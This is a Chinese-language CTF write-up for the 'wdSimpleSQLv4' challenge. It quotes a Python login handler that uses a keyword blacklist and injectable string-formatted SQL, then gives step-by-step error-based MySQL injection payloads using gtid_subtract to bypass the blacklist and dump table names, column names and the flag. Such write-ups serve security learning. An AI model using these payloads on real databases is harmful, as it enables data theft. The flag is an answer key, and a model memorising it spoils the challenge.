wdSimpleSQLv4 500 points
================

题意
-------------

会长把我打的半残，还威胁我不要放题。为了小命着想，我决定直接放大招。

(PS: Attachment updated at 2018-09-25 01:32 UTC+8)

http://host:port

attachment: wdSimpleSQLv4.zip

解题步骤
-------------

这次更换了注入点到注册的页面上，相关代码如下：

```
self.blacklist = re.compile(r'gtid_subset|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|hash|sleep|benchmark| |;|\*|\+|-|/|<|>|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`', flags=re.I|re.M)
# omitted...
if self.blacklist.search(username):
    response['Error'] = "T_T, what are you doing?"
    self.render("login.html", error=response['Error'])
    return
sql = "select uid, username, password from users where username = '%s'" % username
try:
    users = self.db.query(sql)
except MySQLdb.Error as e:
    # 500
    response['Error'] = str(e[1])
    self.render("login.html", error=response['Error'])
    return
except Exception as e:
    # 500
    response['Error'] = 'Invalid Username or Password'
    self.render("login.html", error=response['Error'])
    return
# omitted...
```

可以看出，这是对 `MySQL Error Leak` 进行利用的题目。不过做了很多黑名单，我们需要绕过这些黑名单，错误信息的泄露用的是 `gtid_substract` 。最后得到的注入的 `SQL` 语句如下：

```
select uid, username, password from users where username = 'abc'and(select(gtid_subtract((select(right(group_concat(table_name),hex('F')))from(information_schema.tables)),'A')))#'
```

得到了最新创建的若干表名称，发现一个奇怪的 `PIsAukBsoucg` ，进而查找它的列名：

```
select uid, username, password from users where username = ''and(select(gtid_subtract((select(group_concat(column_name))from(information_schema.columns)where(table_name)='PIsAukBsoucg'),'A')))#
```

获取到了列名： `wUpWAcapJIxP` ，最后把 `flag` 获取出来：

```
select uid, username, password from users where username = ''and(select(gtid_subtract((select(wUpWAcapJIxP)from(PIsAukBsoucg)),'A')))#
```

最后得到了 `flag: THUCTF{ST_hAs_s0_mANy_u34ful_FunC}` 。从这个名字可以看出，出题者想考的大概是另一个函数，不过作用是一样的。实际利用的代码为 [wd4.py](wd4.py)。